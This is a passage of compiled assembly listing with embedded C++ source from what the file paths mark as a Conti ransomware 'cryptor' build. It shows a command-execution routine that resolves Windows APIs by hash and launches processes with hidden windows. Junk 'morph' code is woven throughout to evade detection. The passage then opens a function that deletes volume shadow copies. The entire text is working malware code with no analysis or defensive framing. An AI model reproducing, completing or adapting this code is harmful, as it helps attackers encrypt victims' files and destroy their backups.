  00212	75 7f		 jne	 SHORT $LN60@CmdExecW
  00214	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL53@CmdExecW:
  00220	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$4[rsp]
  00224	ff c0		 inc	 eax
  00226	89 44 24 50	 mov	 DWORD PTR _morph_var$4[rsp], eax
  0022a	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$4[rsp]
  0022e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00233	7d 07		 jge	 SHORT $LN246@CmdExecW
  00235	ff c8		 dec	 eax
  00237	83 c8 fc	 or	 eax, -4
  0023a	ff c0		 inc	 eax
$LN246@CmdExecW:
  0023c	85 c0		 test	 eax, eax
  0023e	74 e0		 je	 SHORT $LL53@CmdExecW

; 51   : 	}

  00240	eb 51		 jmp	 SHORT $LN60@CmdExecW
$LN61@CmdExecW:

; 53   : 		_morph_var -= (int)a - 2;

  00242	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$4[rsp]
  00246	ff c0		 inc	 eax
  00248	89 44 24 50	 mov	 DWORD PTR _morph_var$4[rsp], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0024c	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00251	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$4[rsp]
  00255	f7 e9		 imul	 ecx
  00257	8b c2		 mov	 eax, edx
  00259	c1 e8 1f	 shr	 eax, 31
  0025c	03 d0		 add	 edx, eax
  0025e	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00261	3b c8		 cmp	 ecx, eax
  00263	75 2e		 jne	 SHORT $LN60@CmdExecW
  00265	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL55@CmdExecW:
  00270	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$4[rsp]
  00274	ff c0		 inc	 eax
  00276	89 44 24 50	 mov	 DWORD PTR _morph_var$4[rsp], eax
  0027a	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0027f	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$4[rsp]
  00283	f7 e9		 imul	 ecx
  00285	8b c2		 mov	 eax, edx
  00287	c1 e8 1f	 shr	 eax, 31
  0028a	03 d0		 add	 edx, eax
  0028c	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0028f	3b c8		 cmp	 ecx, eax
  00291	74 dd		 je	 SHORT $LL55@CmdExecW
$LN60@CmdExecW:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 277  : 	pFunction = (LPWSTR(WINAPI*)(LPWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x3fd9cc6a, 87);//GetProcAddress(hKernel32, OBFA("lstrcpyW"));

  00293	ba 0f 00 00 00	 mov	 edx, 15
  00298	41 b8 6a cc d9
	3f		 mov	 r8d, 1071238250		; 3fd9cc6aH
  0029e	44 8d 4a 48	 lea	 r9d, QWORD PTR [rdx+72]
  002a2	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 278  : 	return pFunction(lpString1, lpString2);

  002a7	48 8b d3	 mov	 rdx, rbx
  002aa	48 8d 4d e0	 lea	 rcx, QWORD PTR CmdLine$[rbp-256]
  002ae	ff d0		 call	 rax

; 267  : 	pFunction = (BOOL(WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x3a963686, 88);//GetProcAddress(hKernel32, OBFA("CreateProcessW"));

  002b0	ba 0f 00 00 00	 mov	 edx, 15
  002b5	41 b8 86 36 96
	3a		 mov	 r8d, 982922886		; 3a963686H
  002bb	44 8d 4a 49	 lea	 r9d, QWORD PTR [rdx+73]
  002bf	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 268  : 	return pFunction(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);

  002c4	48 8d 4c 24 58	 lea	 rcx, QWORD PTR pi$[rsp]
  002c9	45 33 c9	 xor	 r9d, r9d
  002cc	48 89 4c 24 48	 mov	 QWORD PTR [rsp+72], rcx
  002d1	48 8d 55 e0	 lea	 rdx, QWORD PTR CmdLine$[rbp-256]
  002d5	48 8d 4c 24 70	 lea	 rcx, QWORD PTR si$[rsp]
  002da	45 33 c0	 xor	 r8d, r8d
  002dd	48 89 4c 24 40	 mov	 QWORD PTR [rsp+64], rcx
  002e2	33 c9		 xor	 ecx, ecx
  002e4	48 89 7c 24 38	 mov	 QWORD PTR [rsp+56], rdi
  002e9	48 89 7c 24 30	 mov	 QWORD PTR [rsp+48], rdi
  002ee	c7 44 24 28 00
	00 00 08	 mov	 DWORD PTR [rsp+40], 134217728 ; 08000000H
  002f6	89 7c 24 20	 mov	 DWORD PTR [rsp+32], edi
  002fa	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 45   : 	if (pCreateProcessW(NULL, CmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))

  002fc	85 c0		 test	 eax, eax
  002fe	0f 84 af 02 00
	00		 je	 $LN139@CmdExecW

; 46   : 	{
; 47   : 
; 48   : 		pWaitForSingleObject(pi.hProcess, 10000);

  00304	48 8b 7c 24 58	 mov	 rdi, QWORD PTR pi$[rsp]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 159  : 	pFunction = (DWORD(WINAPI*)(HANDLE, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe0c23134, 98);//GetProcAddress(hKernel32, OBFA("WaitForSingleObject"));

  00309	ba 0f 00 00 00	 mov	 edx, 15
  0030e	41 b8 34 31 c2
	e0		 mov	 r8d, -524144332		; e0c23134H
  00314	44 8d 4a 53	 lea	 r9d, QWORD PTR [rdx+83]
  00318	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 160  : 	return pFunction(hHandle, dwMilliseconds);

  0031d	ba 10 27 00 00	 mov	 edx, 10000		; 00002710H
  00322	48 8b cf	 mov	 rcx, rdi
  00325	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00327	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$3[rsp], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  0032f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00334	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$3[rsp]
  00338	bb 02 00 00 00	 mov	 ebx, 2
  0033d	f7 e9		 imul	 ecx
  0033f	8b c2		 mov	 eax, edx
  00341	c1 e8 1f	 shr	 eax, 31
  00344	03 d0		 add	 edx, eax
  00346	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00349	3b c8		 cmp	 ecx, eax
  0034b	74 55		 je	 SHORT $LN90@CmdExecW

; 49   : 		_morph_var += (int)a + 2;

  0034d	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$3[rsp]
  00351	8b 44 24 58	 mov	 eax, DWORD PTR pi$[rsp]
  00355	03 c3		 add	 eax, ebx
  00357	03 c8		 add	 ecx, eax
  00359	89 4c 24 50	 mov	 DWORD PTR _morph_var$3[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0035d	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$3[rsp]
  00361	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00366	7d 07		 jge	 SHORT $LN244@CmdExecW
  00368	ff c8		 dec	 eax
  0036a	83 c8 fc	 or	 eax, -4
  0036d	ff c0		 inc	 eax
$LN244@CmdExecW:
  0036f	85 c0		 test	 eax, eax
  00371	0f 85 7c 00 00
	00		 jne	 $LN89@CmdExecW
  00377	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL82@CmdExecW:
  00380	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$3[rsp]
  00384	ff c0		 inc	 eax
  00386	89 44 24 50	 mov	 DWORD PTR _morph_var$3[rsp], eax
  0038a	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$3[rsp]
  0038e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00393	7d 07		 jge	 SHORT $LN243@CmdExecW
  00395	ff c8		 dec	 eax
  00397	83 c8 fc	 or	 eax, -4
  0039a	ff c0		 inc	 eax
$LN243@CmdExecW:
  0039c	85 c0		 test	 eax, eax
  0039e	74 e0		 je	 SHORT $LL82@CmdExecW

; 51   : 	}

  003a0	eb 51		 jmp	 SHORT $LN89@CmdExecW
$LN90@CmdExecW:

; 52   : 	else if (_morph_var % 2) {

  003a2	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$3[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  003a6	8b cb		 mov	 ecx, ebx
  003a8	2b 4c 24 58	 sub	 ecx, DWORD PTR pi$[rsp]
  003ac	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$3[rsp]
  003b0	03 c1		 add	 eax, ecx
  003b2	89 44 24 50	 mov	 DWORD PTR _morph_var$3[rsp], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  003b6	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  003bb	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$3[rsp]
  003bf	f7 e9		 imul	 ecx
  003c1	8b c2		 mov	 eax, edx
  003c3	c1 e8 1f	 shr	 eax, 31
  003c6	03 d0		 add	 edx, eax
  003c8	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  003cb	3b c8		 cmp	 ecx, eax
  003cd	75 24		 jne	 SHORT $LN89@CmdExecW
  003cf	90		 npad	 1
$LL84@CmdExecW:
  003d0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$3[rsp]
  003d4	ff c0		 inc	 eax
  003d6	89 44 24 50	 mov	 DWORD PTR _morph_var$3[rsp], eax
  003da	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  003df	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$3[rsp]
  003e3	f7 e9		 imul	 ecx
  003e5	8b c2		 mov	 eax, edx
  003e7	c1 e8 1f	 shr	 eax, 31
  003ea	03 d0		 add	 edx, eax
  003ec	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  003ef	3b c8		 cmp	 ecx, eax
  003f1	74 dd		 je	 SHORT $LL84@CmdExecW
$LN89@CmdExecW:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 50   : 		pCloseHandle(pi.hThread);

  003f3	48 8b 7c 24 60	 mov	 rdi, QWORD PTR pi$[rsp+8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  003f8	ba 0f 00 00 00	 mov	 edx, 15
  003fd	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  00403	44 8d 4a 4c	 lea	 r9d, QWORD PTR [rdx+76]
  00407	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 229  : 	return pFunction(hObject);

  0040c	48 8b cf	 mov	 rcx, rdi
  0040f	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00411	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$2[rsp], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00419	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0041e	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$2[rsp]
  00422	f7 e9		 imul	 ecx
  00424	8b c2		 mov	 eax, edx
  00426	c1 e8 1f	 shr	 eax, 31
  00429	03 d0		 add	 edx, eax
  0042b	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0042e	3b c8		 cmp	 ecx, eax
  00430	74 50		 je	 SHORT $LN115@CmdExecW

; 49   : 		_morph_var += (int)a + 2;

  00432	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$2[rsp]
  00436	8b 44 24 60	 mov	 eax, DWORD PTR pi$[rsp+8]
  0043a	03 c3		 add	 eax, ebx
  0043c	03 c8		 add	 ecx, eax
  0043e	89 4c 24 50	 mov	 DWORD PTR _morph_var$2[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00442	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$2[rsp]
  00446	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0044b	7d 07		 jge	 SHORT $LN241@CmdExecW
  0044d	ff c8		 dec	 eax
  0044f	83 c8 fc	 or	 eax, -4
  00452	ff c0		 inc	 eax
$LN241@CmdExecW:
  00454	85 c0		 test	 eax, eax
  00456	75 7b		 jne	 SHORT $LN114@CmdExecW
  00458	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL107@CmdExecW:
  00460	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$2[rsp]
  00464	ff c0		 inc	 eax
  00466	89 44 24 50	 mov	 DWORD PTR _morph_var$2[rsp], eax
  0046a	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$2[rsp]
  0046e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00473	7d 07		 jge	 SHORT $LN240@CmdExecW
  00475	ff c8		 dec	 eax
  00477	83 c8 fc	 or	 eax, -4
  0047a	ff c0		 inc	 eax
$LN240@CmdExecW:
  0047c	85 c0		 test	 eax, eax
  0047e	74 e0		 je	 SHORT $LL107@CmdExecW

; 51   : 	}

  00480	eb 51		 jmp	 SHORT $LN114@CmdExecW
$LN115@CmdExecW:

; 52   : 	else if (_morph_var % 2) {

  00482	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$2[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  00486	8b cb		 mov	 ecx, ebx
  00488	2b 4c 24 60	 sub	 ecx, DWORD PTR pi$[rsp+8]
  0048c	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$2[rsp]
  00490	03 c1		 add	 eax, ecx
  00492	89 44 24 50	 mov	 DWORD PTR _morph_var$2[rsp], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00496	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0049b	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$2[rsp]
  0049f	f7 e9		 imul	 ecx
  004a1	8b c2		 mov	 eax, edx
  004a3	c1 e8 1f	 shr	 eax, 31
  004a6	03 d0		 add	 edx, eax
  004a8	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  004ab	3b c8		 cmp	 ecx, eax
  004ad	75 24		 jne	 SHORT $LN114@CmdExecW
  004af	90		 npad	 1
$LL109@CmdExecW:
  004b0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$2[rsp]
  004b4	ff c0		 inc	 eax
  004b6	89 44 24 50	 mov	 DWORD PTR _morph_var$2[rsp], eax
  004ba	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  004bf	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$2[rsp]
  004c3	f7 e9		 imul	 ecx
  004c5	8b c2		 mov	 eax, edx
  004c7	c1 e8 1f	 shr	 eax, 31
  004ca	03 d0		 add	 edx, eax
  004cc	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  004cf	3b c8		 cmp	 ecx, eax
  004d1	74 dd		 je	 SHORT $LL109@CmdExecW
$LN114@CmdExecW:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 52   : 		pCloseHandle(pi.hProcess);

  004d3	48 8b 7c 24 58	 mov	 rdi, QWORD PTR pi$[rsp]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  004d8	ba 0f 00 00 00	 mov	 edx, 15
  004dd	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  004e3	44 8d 4a 4c	 lea	 r9d, QWORD PTR [rdx+76]
  004e7	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 229  : 	return pFunction(hObject);

  004ec	48 8b cf	 mov	 rcx, rdi
  004ef	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  004f1	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$1[rsp], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  004f9	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  004fe	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$1[rsp]
  00502	f7 e9		 imul	 ecx
  00504	8b c2		 mov	 eax, edx
  00506	c1 e8 1f	 shr	 eax, 31
  00509	03 d0		 add	 edx, eax
  0050b	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0050e	3b c8		 cmp	 ecx, eax
  00510	74 50		 je	 SHORT $LN140@CmdExecW

; 49   : 		_morph_var += (int)a + 2;

  00512	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$1[rsp]
  00516	8b 44 24 58	 mov	 eax, DWORD PTR pi$[rsp]
  0051a	03 c3		 add	 eax, ebx
  0051c	03 c8		 add	 ecx, eax
  0051e	89 4c 24 50	 mov	 DWORD PTR _morph_var$1[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00522	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$1[rsp]
  00526	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0052b	7d 07		 jge	 SHORT $LN238@CmdExecW
  0052d	ff c8		 dec	 eax
  0052f	83 c8 fc	 or	 eax, -4
  00532	ff c0		 inc	 eax
$LN238@CmdExecW:
  00534	85 c0		 test	 eax, eax
  00536	75 7b		 jne	 SHORT $LN139@CmdExecW
  00538	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL132@CmdExecW:
  00540	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$1[rsp]
  00544	ff c0		 inc	 eax
  00546	89 44 24 50	 mov	 DWORD PTR _morph_var$1[rsp], eax
  0054a	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$1[rsp]
  0054e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00553	7d 07		 jge	 SHORT $LN237@CmdExecW
  00555	ff c8		 dec	 eax
  00557	83 c8 fc	 or	 eax, -4
  0055a	ff c0		 inc	 eax
$LN237@CmdExecW:
  0055c	85 c0		 test	 eax, eax
  0055e	74 e0		 je	 SHORT $LL132@CmdExecW

; 51   : 	}

  00560	eb 51		 jmp	 SHORT $LN139@CmdExecW
$LN140@CmdExecW:

; 52   : 	else if (_morph_var % 2) {

  00562	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$1[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  00566	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$1[rsp]
  0056a	2b 5c 24 58	 sub	 ebx, DWORD PTR pi$[rsp]
  0056e	03 c3		 add	 eax, ebx
  00570	89 44 24 50	 mov	 DWORD PTR _morph_var$1[rsp], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00574	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00579	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$1[rsp]
  0057d	f7 e9		 imul	 ecx
  0057f	8b c2		 mov	 eax, edx
  00581	c1 e8 1f	 shr	 eax, 31
  00584	03 d0		 add	 edx, eax
  00586	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00589	3b c8		 cmp	 ecx, eax
  0058b	75 26		 jne	 SHORT $LN139@CmdExecW
  0058d	0f 1f 00	 npad	 3
$LL134@CmdExecW:
  00590	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$1[rsp]
  00594	ff c0		 inc	 eax
  00596	89 44 24 50	 mov	 DWORD PTR _morph_var$1[rsp], eax
  0059a	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0059f	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$1[rsp]
  005a3	f7 e9		 imul	 ecx
  005a5	8b c2		 mov	 eax, edx
  005a7	c1 e8 1f	 shr	 eax, 31
  005aa	03 d0		 add	 edx, eax
  005ac	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  005af	3b c8		 cmp	 ecx, eax
  005b1	74 dd		 je	 SHORT $LL134@CmdExecW
$LN139@CmdExecW:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 56   : }

  005b3	48 8b 8d e0 07
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-256]
  005ba	48 33 cc	 xor	 rcx, rsp
  005bd	e8 00 00 00 00	 call	 __security_check_cookie
  005c2	4c 8d 9c 24 f0
	08 00 00	 lea	 r11, QWORD PTR [rsp+2288]
  005ca	49 8b 5b 18	 mov	 rbx, QWORD PTR [r11+24]
  005ce	49 8b 7b 20	 mov	 rdi, QWORD PTR [r11+32]
  005d2	49 8b e3	 mov	 rsp, r11
  005d5	5d		 pop	 rbp
  005d6	c3		 ret	 0
?CmdExecW@@YAXPEB_W@Z ENDP				; CmdExecW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?DeleteShadowCopies@cryptor@@YAFPEAX@Z
_TEXT	SEGMENT
_morph_var$7 = 80
_morph_var$8 = 80
_morph_var$9 = 80
_morph_var$10 = 80
_morph_var$11 = 80
_morph_var$12 = 80
_morph_var$13 = 80
_morph_var$14 = 80
_morph_var$15 = 80
_morph_var$16 = 80
_morph_var$17 = 80
_morph_var$18 = 80
_morph_var$19 = 80
_morph_var$20 = 80
_morph_var$21 = 80
$T5 = 84
$T3 = 96
$T2 = 112
$T1 = 136
$T4 = 184
$T6 = 256
pSvc$ = 416
pLoc$ = 424
Old$22 = 432
pEnumerator$ = 440
pContext$ = 448
pclsObj$ = 456
vtProp$23 = 464
uReturn$ = 488
vArchitecture$24 = 496
SysInfo$ = 520
CmdLine$25 = 576
__$ArrayPad$ = 2624
Reserved$dead$ = 2672
?DeleteShadowCopies@cryptor@@YAFPEAX@Z PROC		; cryptor::DeleteShadowCopies, COMDAT

; 60   : {

$LN1686:
  00000	40 55		 push	 rbp
  00002	56		 push	 rsi
  00003	57		 push	 rdi
  00004	48 8d ac 24 b0
	f6 ff ff	 lea	 rbp, QWORD PTR [rsp-2384]
  0000c	48 81 ec 50 0a
	00 00		 sub	 rsp, 2640		; 00000a50H
  00013	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0001a	48 33 c4	 xor	 rax, rsp
  0001d	48 89 85 40 09
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp-256], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

